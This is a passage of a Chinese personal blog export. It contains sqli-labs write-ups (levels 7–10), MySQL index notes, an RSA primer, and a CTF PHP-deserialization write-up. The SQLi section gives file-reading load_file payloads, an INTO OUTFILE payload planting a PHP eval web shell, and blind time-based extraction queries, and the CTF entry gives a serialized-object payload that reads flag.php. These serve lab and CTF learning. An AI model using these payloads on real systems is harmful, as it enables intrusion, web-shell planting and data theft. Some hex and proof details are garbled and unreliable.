<h1 id="导入导出相关操作"><a href="#导入导出相关操作" class="headerlink" title="导入导出相关操作"></a>导入导出相关操作</h1><h2 id="load-file"><a href="#load-file" class="headerlink" title="load_file()"></a><strong><font face="隶书">load_file()</font></strong></h2><p><em>load_file(file_name)</em>：读取文件并返回该文件的内容作为一个字符串。</p>
<blockquote>
<p>使用条件：<br>A.必须有权限读取并且文件可读<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (<span class="keyword">select</span> <span class="keyword">count</span>(*) <span class="keyword">from</span> mysql.user)&gt;<span class="number">0</span><span class="comment">/* 如果结果返回正常，说明具有读写权限。如果返回错误，则说明管理员给数据库降权。</span></span><br></pre></td></tr></table></figure></p>
<p>B.欲读取文件必须在服务器上。<br>C.必须指定文件完整的路径<br>D.欲读取文件必须小于max_allowed_packet。</p>
</blockquote>
<p>实际应用时，文件读取权限是最难满足的，我们有两个难点需要解决：</p>
<blockquote>
<p>绝对物理路径<br>构造有效的畸形语句(报错爆出绝对路径)</p>
</blockquote>
<p><strong>实例：</strong><br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="keyword">hex</span>(<span class="keyword">replace</span>(<span class="keyword">load_file</span>(<span class="built_in">char</span>(<span class="number">99</span>,<span class="number">58</span>,<span class="number">92</span>,<span class="number">119</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">100</span>,<span class="number">111</span>,<span class="number">119</span>,<span class="number">115</span>,<span class="number">92</span>,<span class="number">114</span>,<span class="number">101</span>,<span class="number">112</span>,<span class="number">97</span>,<span class="number">105</span>,<span class="number">114</span>,<span class="number">92</span>,<span class="number">115</span>,<span class="number">97</span>,<span class="number">109</span>))))</span><br></pre></td></tr></table></figure></p>
<p>利用hex()将文件导出来，特别是smb文件</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">load_file</span>(<span class="built_in">char</span>(<span class="number">99</span>,<span class="number">58</span>,<span class="number">47</span>,<span class="number">98</span>,<span class="number">111</span>,<span class="number">111</span>,<span class="number">116</span>,<span class="number">46</span>,<span class="number">105</span>,<span class="number">110</span>,<span class="number">105</span>))</span><br></pre></td></tr></table></figure>
<p><strong><font face="隶书">explain：</font></strong>c:/boot.ini的十六进制是0x633s2f626f6f742e696e69</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">-1 union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">1</span>,<span class="number">1</span>,<span class="keyword">load_file</span>(C:\\boot.ini)</span><br></pre></td></tr></table></figure>
<p><strong><font face="隶书">explain：</font></strong>路径里的/用\\\\代替</p>
<h2 id="load-data-file导入数据库"><a href="#load-data-file导入数据库" class="headerlink" title="load data file导入数据库"></a><strong><font face="隶书">load data file导入数据库</font></strong></h2><p>略。</p>
<h2 id="导入到文件中"><a href="#导入到文件中" class="headerlink" title="导入到文件中"></a><strong>导入到文件中</strong></h2><p>SELECT INTO OUTFILE ‘file_name’,具体参阅其他文章。</p>
<hr>
<h1 id="LESS-7"><a href="#LESS-7" class="headerlink" title="LESS-7"></a>LESS-7</h1><p>这个题目有两种闭合方式, <code>?id=1’ or ‘a’=’a</code> 或者 <code>?id=1’))</code>，我们尝试导出文件</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1')) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'G://PHPwamp/wamp64/tmp/less7.txt'</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>虽然会报错，但是可以看到文件还是导出成功了。</p>
<blockquote>
<p>Dumb    Dumb    Dumb<br>1        2        3</p>
</blockquote>
<p>所以我们可以导一句话木马进去。</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1')) union <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="string">'&lt;?php @eval($_post["mima"])?&gt;'</span> <span class="keyword">into</span> <span class="keyword">outfile</span> <span class="string">'G:/PHPwamp/wamp64/tmp/7.php'</span><span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>接下来就可以用菜刀等工具连接了，但是还是没连成功。<br>接下里也可以上传其他的东西。</p>
<h1 id="LESS-8"><a href="#LESS-8" class="headerlink" title="LESS-8"></a>LESS-8</h1><p>简单尝试可得 <code>?id=1’ or 1=1 —+</code>可以回显，那么可以利用盲注，参考第五关。由于本关对报错返回信息进行了注释，故不可以利用报错注入。盲注payload<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1%27and%20if(ascii(substr(database(),1,1))=115,1,sleep(5))<span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
<p><strong>注意：</strong>这关要使用url编码了，否则无法正常回显。</p>
<h1 id="LESS-9"><a href="#LESS-9" class="headerlink" title="LESS-9"></a>LESS-9</h1><p>通过标题可知是单引号闭合，由于没有回显，所以尝试用延时注入<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'and if(ascii(substr(database(),1,1))=115,1,sleep(5))<span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
<p>逐位爆破则可以得到数据库名security</p>
<p>接下来爆表<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'and if(ascii(substr((<span class="keyword">select</span> table_name <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema=<span class="string">'security'</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">101</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
<p>爆列名</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'and if(ascii(substr((<span class="keyword">select</span> column_name <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name=<span class="string">'users'</span> <span class="keyword">limit</span> <span class="number">3</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">105</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>这个表的前三个字段是一些系统信息，所以要从第四个结果开始注入。</p>
<p>爆内容</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1'and if(ascii(substr((<span class="keyword">select</span> username <span class="keyword">from</span> <span class="keyword">users</span> <span class="keyword">limit</span> <span class="number">0</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">68</span>,<span class="number">1</span>,<span class="keyword">sleep</span>(<span class="number">5</span>))<span class="comment">--+</span></span><br></pre></td></tr></table></figure>
<p>如此可以得到所有信息。</p>
<h1 id="LESS-10"><a href="#LESS-10" class="headerlink" title="LESS-10"></a>LESS-10</h1><p>单引号闭合改成了双引号闭合，其他都不变。<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1" and if(ascii(substr(database(),1,1))=115,1,sleep(5))<span class="comment">--+</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      
        <categories>
            
            <category> writeup </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL注入 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[MySQL学习笔记(四)]]></title>
      <url>/2018/02/03/MySql4/</url>
      <content type="html"><![CDATA[<h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>本次学习内容为MySQL索引与完整性约束，MySQL索引类似于书本的目录，是为了方便地找到要查找的数据。而完整性约束是指对数据的输入合法性等进行完整性约束检查。<br><a id="more"></a></p>
<h1 id="MySQL索引"><a href="#MySQL索引" class="headerlink" title="MySQL索引"></a>MySQL索引</h1><h2 id="索引及其作用"><a href="#索引及其作用" class="headerlink" title="索引及其作用"></a>索引及其作用</h2><p>MySQL索引的存储方式是另外存储一个文件来保存索引值，查找时通过索引定位到行的位置从而快速的查找数据。MySQL索引可以由最多15个列组成，<em>最大索引长度</em> 是<code>256</code>字节。</p>
<h2 id="索引的分类"><a href="#索引的分类" class="headerlink" title="索引的分类"></a>索引的分类</h2><p>由于索引是保存在文件中的，所以是要占据磁盘空间的，MySQL中一个表的索引都保存在一个索引文件夹中，如果增加删除或者更新表的一行，那么MySQL也会自动的更新索引，保证索引和表中的内容保持一致。</p>
<p>1、 BTREE索引</p>
<p>普通索引(INDEX)</p>
<blockquote>
<p>这是最基本的索引，没有唯一性约束，</p>
</blockquote>
<p>唯一性索引(UNIQUE)</p>
<blockquote>
<p>唯一性索引，即每一列的索引值都只能出现一次，必须是唯一的。</p>
</blockquote>
<p>主键(PRIMARY KEY)</p>
<blockquote>
<p>主键索引，拥有唯一性索引的特点，但是一个表只能有一个主键。既可以在创建的时候指定，也可以通过修改表的方式加入主键。</p>
</blockquote>
<p>全文索引(FULLTEXT)</p>
<blockquote>
<p>全文索引只能在 <em>VARCHAR</em> 或者 <em>TEXT</em> 类型中使用，并且只能在MyISAM中创建。对于大规模数据集来说，通过 <code>alter table</code>或者 <code>create index</code>命令创建会更快一些。</p>
</blockquote>
<p>2、 哈希索引(HASH)</p>
<p>当表类型为MEMORY或者HEAP时，MySQL还支持HASH索引，当根据一个值获取特定行时，哈希索引非常快。</p>
<h1 id="MySQL索引创建"><a href="#MySQL索引创建" class="headerlink" title="MySQL索引创建"></a>MySQL索引创建</h1><h2 id="create-index"><a href="#create-index" class="headerlink" title="create index"></a>create index</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> [<span class="keyword">unique</span> | fulltext | spatial] <span class="keyword">index</span> 索引名</span><br><span class="line">	[索引类型]</span><br><span class="line">	<span class="keyword">on</span> 表名 (索引列名,)</span><br><span class="line">	[索引选项] ...</span><br><span class="line">索引列名=:</span><br><span class="line">	列名 [(长度)] [<span class="keyword">asc</span> | <span class="keyword">desc</span>]</span><br></pre></td></tr></table></figure>
<p>说明</p>
<blockquote>
<p>spatial为空间索引<br>索引类型包括BTREE和HASH<br><code>create index</code>不能创建 <em>主键</em><br>索引列名，创建索引列名后的长度表示该列前面创建索引字符个数，这可以节省磁盘空间。</p>
</blockquote>
<p><strong>举例</strong></p>
<p>根据sx表的学号列上的前5个字符建立一个升序索引xh_xs</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">index</span> xh_xs</span><br><span class="line">	<span class="keyword">on</span> xs(学号(<span class="number">5</span>) <span class="keyword">asc</span>);</span><br></pre></td></tr></table></figure>
<h2 id="alter-table创建"><a href="#alter-table创建" class="headerlink" title="alter table创建"></a>alter table创建</h2><p>略</p>
<h2 id="建表时创建索引"><a href="#建表时创建索引" class="headerlink" title="建表时创建索引"></a>建表时创建索引</h2><p>略</p>
<h2 id="删除索引"><a href="#删除索引" class="headerlink" title="删除索引"></a>删除索引</h2><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">drop</span> <span class="keyword">index</span> 索引名 <span class="keyword">on</span> 表名</span><br></pre></td></tr></table></figure>
<p>或者</p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">alter</span> [<span class="keyword">ignore</span>] <span class="keyword">table</span> 表名</span><br><span class="line">...</span><br><span class="line">|<span class="keyword">drop</span> primary <span class="keyword">key</span>              # 删除主键</span><br><span class="line">|<span class="keyword">drop</span> &#123;<span class="keyword">index</span>|<span class="keyword">key</span>&#125; 索引名       # 删除索引</span><br><span class="line">|<span class="keyword">drop</span> foreign <span class="keyword">key</span> fk_symbo     # 删除外键</span><br></pre></td></tr></table></figure>
<h1 id="CHECK完整性约束"><a href="#CHECK完整性约束" class="headerlink" title="CHECK完整性约束"></a>CHECK完整性约束</h1><p><strong>语法格式</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">check</span>(expr)</span><br></pre></td></tr></table></figure>
<p><strong>举例</strong></p>
<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">table</span> student</span><br><span class="line">(</span><br><span class="line">	学号  <span class="built_in">char</span>(<span class="number">6</span>) <span class="keyword">not</span> <span class="literal">null</span>,</span><br><span class="line">	性别 <span class="built_in">char</span>(<span class="number">1</span>) <span class="keyword">not</span> <span class="literal">null</span></span><br><span class="line">		<span class="keyword">check</span>(性别 <span class="keyword">in</span> (<span class="string">'男'</span>,<span class="string">'女'</span>))</span><br><span class="line"></span><br><span class="line">)；</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> 资料 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> SQL </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[RSA算法初探]]></title>
      <url>/2018/01/29/RSA%E5%88%9D%E6%8E%A2/</url>
      <content type="html"><![CDATA[<h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><p>不得不承认我的数学真的是灰常灰常渣，研究了好久才差不多弄明白，真的感觉又被数学虐了o(╥﹏╥)o，不过打比赛需要掌握，咬着牙也得弄明白呀。<br><a id="more"></a></p>
<h4 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h4><p>我看许多的介绍文章都是先讲一大堆的数学公式然后再开始介绍RSA，给我一顿绕啊，愣是不知道在干什么，所以我想先介绍RSA，过程中需要什么数学理论再用什么理论，这样对于数学渣渣会友好一些。</p>
<p><strong>RSA介绍</strong></p>
<p>RSA公钥加密算法是1977年由罗纳德·李维斯特（Ron Rivest）、阿迪·萨莫尔（Adi Shamir）和伦纳德·阿德曼（Leonard Adleman）一起提出的。1987年7月首次在美国公布，当时他们三人都在麻省理工学院工作实习。RSA就是他们三人姓氏开头字母拼在一起组成的。<br>RSA是目前最有影响力和最常用的公钥加密算法，它能够抵抗到目前为止已知的绝大多数密码攻击，已被ISO推荐为公钥数据加密标准，是一种<em>非对称加密算法</em>。<br>今天只有短的RSA钥匙才可能被强力方式解破。到2008年为止，世界上还没有任何可靠的攻击RSA算法的方式。只要其钥匙的长度足够长，用RSA加密的信息实际上是不能被解破的。但在分布式计算和量子计算机理论日趋成熟的今天，RSA加密安全性受到了挑战和质疑。<br>RSA算法基于一个十分简单的数论事实：将两个大质数相乘十分容易，但是想要对其乘积进行因式分解却极其困难，因此可以将乘积公开作为加密密钥。<br>一句话，<em>RSA是目前最重要的网络加密算法。</em></p>
<p><strong>RSA密钥生成</strong></p>
<p>第一步</p>
<blockquote>
<p>选定两个质数p、q，实际应用中这两个数越大安全性越高。</p>
</blockquote>
<p>第二步</p>
<blockquote>
<p>计算p、q的乘积，即n = p&#42;q，n的二进制表示时所占的二进制位数就是<em>密钥长度</em>，实际应用中密钥长度一般为1024位，对于更高保密级别的应用则为2048位。</p>
</blockquote>
<p>第三步</p>
<blockquote>
<p>计算n的 <em>欧拉函数</em> φ(n) = (p-1)&#42;(q-1)，为了保持连贯性，欧拉函数先按下不表</p>
</blockquote>
<p>第四步</p>
<blockquote>
<p> 随机选定一个数e1，要求1 &lt; e1 &lt; φ(n)，并且要求e1与n互质（实际应用中这个数字常选择65537），不知道什么是互质请点击<a href="https://baike.baidu.com/item/%E4%BA%92%E8%B4%A8" target="_blank" rel="noopener">这里</a></p>
</blockquote>
<p>第五步</p>
<blockquote>
<p>寻找一个e2，要求 e1 &#42; e2 ≡ 1 （mod φ(n)），好像是可以用<em>扩展欧几里得算法</em> 算出来，但是恕本人实在对数学不感冒，这个就略过了，想学的自己百度吧。</p>
</blockquote>
<p>第六步</p>
<blockquote>
<p>封装<em>（n，e1）</em>为<em>公钥</em> ，<em>（n，e2）</em>为<em>私钥</em>。</p>
</blockquote>
<p>至此，所有准备工作完成。</p>
<hr>
<p><strong>加密和解密</strong></p>
<blockquote>
<p> 先介绍一下加解密的公式，假定明文为A，那么，<br> 密文B≡A^e1 mod n，要传输给对方的就是B<br> 对方得到B之后利用私钥进行恢复，公式A≡B^e2 mod n，从而得到明文A。</p>
</blockquote>
<p>假定我选择了p = 5，q = 7，那么相应的n = 35，φ（n） = 24，再假定我选择了e1 = 5，那么e2 = 29（别问我怎么算出来的，我是不会告诉你我是编代码试出来的！！），那么我的公钥就是（5，35），私钥就是（29，35）。那么接下来就开始我们的秘密通信(<em>^▽^</em>)。</p>
<blockquote>
<p> 假定要传输的明文为： 32<br>  注意：传输的内容必须为整数，并且要小于n，如果要传送字符串，可以用ascii码或unicode      编码传输。</p>
</blockquote>
<p>加密</p>
<blockquote>
<p>A = 32，则B=A^e1 mod n = 2，将密文B发送，这个过程使用公钥进行加密</p>
</blockquote>
<p>解密</p>
<blockquote>
<p>A = B^e2 mod n = 32 ，成功得到明文32！</p>
</blockquote>
<hr>
<p><strong>RSA破解</strong></p>
<p>所谓兵来将挡水来土掩，有人搞出来加密算法，就有人想搞出来破解算法，那么想要破解RSA能做到吗？我们不妨来看一下我们在整个过程中都用到了那些数据</p>
<blockquote>
<p>p、q、n、φ（n），e1，e2</p>
</blockquote>
<p>公钥用到了n，e1，只要我们能找到e2，就攻破了RSA。那么有没有可能通过这两个数找到e2呢？先看看e2是怎么来的</p>
<blockquote>
<p>e1 * e2 mod φ（n） = 1</p>
</blockquote>
<p>根据公式可以知道我们得到φ（n）就可以得到e2，那么φ（n）又是怎么来的呢？</p>
<blockquote>
<p>φ（n）= （p-1）&#42;（q-1）</p>
</blockquote>
<p>我们又需要得到p、q，再来</p>
<blockquote>
<p>n = p * q</p>
</blockquote>
<p>总算到了（开森）！我们只需要分解n就行了！！唉，不得不说，千里之堤毁于蚁穴，大名鼎鼎的RSA居然栽在了这么简单的问题上，哈哈哈！！</p>
<p>但是~~，如果你真的觉得你就此就破解了RSA，那你真是Too Young Too Simple，分解我的n=35，洒洒水的难度，那么，请你给我分解一下下面这个数字怎么样、</p>
<blockquote>
<p>152564564212344523123146785123123456484887123121231234567874645645132165867845456456456545645645123123123156445564523121322312312345645456456565656565</p>
</blockquote>
<p>有办法吗？事实上，分解这些大数的因子是非常非常困难的，以目前的计算能力，分解1024位的大数需要两年，分解2048位的大数需要80年，远超数据本身的价值，这就是RSA算法牢不可破的真实原因，就是建立在大数分解困难的基础上的，所以今后如果计算能力提高，或者找到其它简单算法来分解大数，那么RSA算法安全性就消失了。</p>
<hr>
<p><strong>理论解释</strong></p>
<p>是不是觉得刚刚的东西很神奇？！！，对，就是这么神奇，这背后都是伟大的数学家的功劳，虽然我不喜欢数学，但还是很佩服他们可以搞出这么骚的东西。废话不多说，来慢慢解释一下，鉴于我的数学水平…</p>
<blockquote>
<p>数学解释只解释了所应用的数学原理，不再对数学原理进行证明，如果感兴趣的话可以自己证明之。</p>
</blockquote>
<p>大名鼎鼎的 <em>欧拉定理</em> </p>
<blockquote>
<p>若n,a为正整数，且n,a互质，则<br>$a^{φ(n)} ≡ 1 （mod \; n）$ </p>
</blockquote>
<p>φ（n）为 <em>欧拉函数</em> ,欧拉函数是小于n的正整数中与n互质的数的个数，下面介绍一个性质</p>
<blockquote>
<p>如果n可以分解为两个互质的整数p、q的乘积，那么有<br>φ（n）= (p-1) * (q-1)</p>
</blockquote>
<p>接下来要证明的就是为什么下面两个式子可以互换实现</p>
<blockquote>
<p>B=A^e1   mod n<br>A=B^e2   mod n</p>
</blockquote>
<p>解密规则为</p>
<blockquote>
<p>A=B^e2 mod n</p>
</blockquote>
<p>根据加密规则</p>
<blockquote>
<p>B = A^e1 mod n<br>B = A^e1 - kn</p>
</blockquote>
<p>代入解密式中</p>
<blockquote>
<p>(A^e1 - kn)^e2 ≡ A （mod n）</p>
</blockquote>
<p>等于证</p>
<blockquote>
<p>$A^{e1&#42;e2} ≡ m （mod \; n）$，（对于这一步我并不知道为什么）</p>
</blockquote>
<p>由 <em>欧拉定理</em> 可以得到</p>
<blockquote>
<p>e1&#42;e2 ≡ 1  [ mod φ（n）]<br>e1&#42;e2 ≡ hφ（n）+1</p>
</blockquote>
<p>代入前面的式子可以得到</p>
<blockquote>
<p>$A^{hφ（n）+1} \;= m (mod\;n)$</p>
</blockquote>
<p>接下来证明上述恒等式</p>
<p>分两种情况</p>
<p>1、A和n互质</p>
<p>由欧拉定理</p>
<blockquote>
<p>$A^{φ（n）}≡1（mod\;n）$ </p>
</blockquote>
<p>代入前式可以得到</p>
<blockquote>
<p>${(A^{φ（n）})}^{h}&#42;A \;= m (mod\;n)$</p>
</blockquote>
<p>原式得证</p>
<p>2、A和n不互质</p>
<blockquote>
<p>自己开发吧老铁，我不想写了。而且我也不怎么会。</p>
</blockquote>
<hr>
<p>RSA其实并不难，想要掌握它并不需要很高的数学基础，认真学一学还是可以学的明白的，废话不多说，赶紧练习一波去也！</p>
]]></content>
      
        <categories>
            
            <category> 资料 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> RSA </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[CUMT-CTF2017冬]]></title>
      <url>/2018/01/27/cumtctf2017/</url>
      <content type="html"><![CDATA[<p>第一次打ctf，感觉自己确实是个渣渣，不过万事开头难，有第一次总是好的，这次也让我意识到了自己的不足，自己要学的东西还是很多很多的。<br><a id="more"></a></p>
<h2 id="0x1-what？？"><a href="#0x1-what？？" class="headerlink" title="0x1  what？？"></a>0x1  what？？</h2><p>一个代码审计问题,与反序列化有关</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sky</span> </span></span><br><span class="line"><span class="class"></span>&#123;      </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> sec;     </span><br><span class="line">       &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nosec</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename;      </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;    </span><br><span class="line">        $file = <span class="string">"./&#123;$this-&gt;filename&#125;"</span>;        </span><br><span class="line">        <span class="keyword">if</span> (file_get_contents($file))         </span><br><span class="line">        &#123;              </span><br><span class="line">            <span class="keyword">return</span> file_get_contents($file); </span><br><span class="line">        &#125;  </span><br><span class="line">        <span class="keyword">else</span> </span><br><span class="line">        &#123; </span><br><span class="line">            <span class="keyword">return</span> <span class="string">"you must be joking!"</span>; </span><br><span class="line">        &#125;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sec</span> </span></span><br><span class="line"><span class="class"></span>&#123;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">read</span><span class="params">()</span>     </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">return</span> <span class="string">"it's so sec~~"</span>;      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>($_GET[<span class="string">'data'</span>]))  </span><br><span class="line">&#123; </span><br><span class="line">    $Input_data = unserialize($_GET[<span class="string">'data'</span>]);  </span><br><span class="line">    <span class="keyword">echo</span> $Input_data; </span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>PHP序列化的目的旨在实现不同的PHP文件之间的对象传递，在序列化对象创建之前，如果类中定义了&#95;&#95;sleep()函数，则会调用该函数，而在序列化对象创建时则会调用&#95;&#95;wakeup()函数（如果定义了的话），当然，还有PHP许多其他的魔法方法。<br>分析一下，该例中关键应该在read函数上，但是必须要调用到nosec才可以实现，该例中sky类中默认创建sec类，显示是不行的，必须要创建出nosec才可以用。</p>
<p><strong>payload</strong></p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line">@error_reporting(<span class="number">1</span>); </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">sky</span> </span></span><br><span class="line"><span class="class"></span>&#123;      </span><br><span class="line">    <span class="keyword">protected</span> $skyobj;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span> </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">$this</span>-&gt;skyobj = <span class="keyword">new</span> nosec;<span class="comment">//在此处更改对象，实现对象的绕过     </span></span><br><span class="line">       &#125;  </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__toString</span><span class="params">()</span>      </span></span><br><span class="line"><span class="function">    </span>&#123;          </span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;skyobj))  </span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;skyobj-&gt;read();      </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">nosec</span> </span></span><br><span class="line"><span class="class"></span>&#123;    </span><br><span class="line">    <span class="keyword">public</span> $filename=<span class="string">'flag.php'</span>;      </span><br><span class="line">&#125;</span><br><span class="line">$obj = <span class="keyword">new</span> sky();</span><br><span class="line"><span class="keyword">echo</span> urlencode(serialize($obj)) <span class="comment">//千万记住url编码，真的太多坑！！！！</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>O%3A3%3A%22sky%22%3A1%3A%7Bs%3A9%3A%22%00%2A%00skyobj%22%3BO%3A5%3A%22nosec%22%3A1%3A%7Bs%3A8%3A%22filename%22%3Bs%3A8%3A%22flag.php%22%3B%7D%7D</p>
</blockquote>
